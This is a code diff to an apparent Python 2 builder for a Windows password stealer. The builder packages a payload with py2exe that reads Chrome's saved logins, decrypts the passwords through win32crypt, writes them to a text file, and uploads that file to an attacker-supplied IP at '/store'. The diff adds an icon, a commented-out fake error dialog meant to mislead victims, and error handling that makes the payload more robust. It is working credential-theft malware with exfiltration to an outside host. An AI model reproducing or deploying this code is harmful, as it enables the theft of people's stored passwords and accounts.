@@ -1,8 +1,9 @@
 #Created by darkArp. For more info check the instructions text file. MarioNascimento@ITCrashSecurity.com
 #Contains test code to be cleaned up
-import os 
-import sys 
-import cgi 
+#To activate Fake Error Message uncomment line 147
+import os, socket
+import sys
+import cgi
 import py2exe
 import BaseHTTPServer
 import sqlite3
@@ -32,10 +33,11 @@ def py2crypt():
     sys.argv.append("py2exe")
     setup(
         options = {'py2exe': {'bundle_files': 1}},
-        windows = [{'script': "server.py",}],
+        console = [{'script': "server.py",
+                    "icon_resources": [(0, "icon.ico")]}],
         zipfile = None,
         )
-    
+
 #  'uac_info': "requireAdministrator"
 
     if os.path.exists('server.exe'):
@@ -44,20 +46,22 @@ def py2crypt():
     shutil.rmtree('build/')
     shutil.rmtree('dist/')
 
-    
+
 with open('create_server.py') as f1:
     with open('server.py', 'w') as f2:
         lines = f1.readlines()
-        i = 59
-        f2.write("global attacker_ip\nattacker_ip = " + '\'' + attacker_ip+ '\'' + '\n')
+        i = 61
+        f2.write("global attacker_ip\nattacker_ip = " + '\'' + attacker_ip + '\'' + '\n')
         while(i<len(lines)-1):
             f2.write(lines[i])
             i = i+1
     py2crypt()
-    os.remove('server.py')
+    #os.remove('server.py')
     done()
+
 """
 # -*- coding: cp1250 -*-
+import ctypes
 import os, sys, cgi, py2exe, BaseHTTPServer, sqlite3, win32crypt
 import requests
 import subprocess
@@ -101,39 +105,44 @@ conn = sqlite3.connect(path2)
 
 cursor = conn.cursor()
 
-cursor.execute('SELECT action_url, username_value, password_value FROM logins') 
+cursor.execute('SELECT action_url, username_value, password_value FROM logins')
 
 path3=getenv("LOCALAPPDATA")
 Null,userprof = (subprocess.check_output('set USERPROFILE', shell=True).split('='))
 #destination = 'passwords.txt'
 destination = getenv("LOCALAPPDATA") + "\\" + "passwords.txt"
-print userprof
-print destination
 
-for raw in cursor.fetchall():                       
-    
-    if os.path.exists(destination):
-        with open(destination, "a") as password:
-            password.write('\n' + raw[0] + '\n' + raw[1] + '\n')
+for raw in cursor.fetchall():
+    try:
 
-        with open(destination, "a") as password:
-            password.write(format(win32crypt.CryptUnprotectData(raw[2])[1]) + '\n')
 
-    else:
-        with open(destination, "a") as password:
-            password.write(raw[0] + '\n' + raw[1] + '\n')
+        if os.path.exists(destination):
+            with open(destination, "a") as password:
+                password.write('\n' + raw[0] + '\n' + raw[1] + '\n')
 
-        with open(destination, "a") as password:
-            password.write(format(win32crypt.CryptUnprotectData(raw[2])[1]) + '\n')
+            with open(destination, "a") as password:
+                password.write(format(win32crypt.CryptUnprotectData(raw[2])[1]) + '\n')
+
+        else:
+            with open(destination, "a") as password:
+                password.write(raw[0] + '\n' + raw[1] + '\n')
+
+            with open(destination, "a") as password:
+                password.write(format(win32crypt.CryptUnprotectData(raw[2])[1]) + '\n')
+    except:
+        continue
 
 conn.close()
 
 command = "grab*" + destination
 
-req = requests.get('http://' + attacker_ip)    
-grab,path=command.split('*') 
-path=destination           
-url = 'http://' + attacker_ip + '/store' 
+req = requests.get('http://' + attacker_ip)
+grab,path=command.split('*')
+path=destination
+url = 'http://' + attacker_ip + '/store'
 files = {'file': open(path, 'rb')}
 r = requests.post(url, files=files)
+MB_OK = 0x00
+MB_ICONSTOP = 0x10
+#ctypes.windll.user32.MessageBoxW(None, u'Virtual memory is too low to run this program', u'Error', MB_OK | MB_ICONSTOP)
 """
